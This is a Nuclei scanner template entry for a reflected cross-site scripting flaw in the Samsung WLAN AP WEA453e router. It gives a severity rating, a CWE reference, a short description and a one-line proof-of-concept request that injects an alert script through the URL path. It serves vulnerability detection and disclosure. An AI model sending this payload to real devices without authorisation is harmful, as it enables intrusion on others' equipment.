# Nuclei Template: Samsung WLAN AP WEA453e - Cross-Site Scripting
**Template ID:** samsung-wlan-ap-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** High
**CWE:** CWE-80
**Source:** Nuclei Template (`samsung-wlan-ap-xss.yaml`)

## Vulnerability Information & PoC

## Description
Samsung WLAN AP WEA453e router contains a cross-site scripting vulnerability. An attacker can execute arbitrary script and thus steal cookie-based authentication credentials and launch other attacks.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/%3Cscript%3Ealert(document.domain)%3C/script%3E
```

## References
- https://iryl.info/2020/11/27/exploiting-samsung-router-wlan-ap-wea453e/
